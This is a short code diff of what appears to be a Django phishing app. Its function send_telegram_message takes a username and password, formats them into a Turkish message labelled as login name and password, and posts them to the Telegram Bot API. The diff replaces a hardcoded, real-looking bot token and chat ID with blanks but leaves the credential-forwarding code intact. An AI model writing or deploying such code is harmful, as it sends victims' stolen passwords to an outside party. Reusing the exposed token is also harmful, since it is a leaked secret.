@@ -13,8 +13,8 @@ def index(request):
     return render(request, 'myapp/index.html')
 
 def send_telegram_message(username, password):
-    bot_token = '6924985170:AAHZLuymEWEDcVOyB3FYIUuS5M9xw4nZUNA'
-    chat_id = '1217630043'
+    bot_token = ':'
+    chat_id = ''
 
     message = f'Kullanıcı Adı: {username}, Şifre: {password}'
     url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
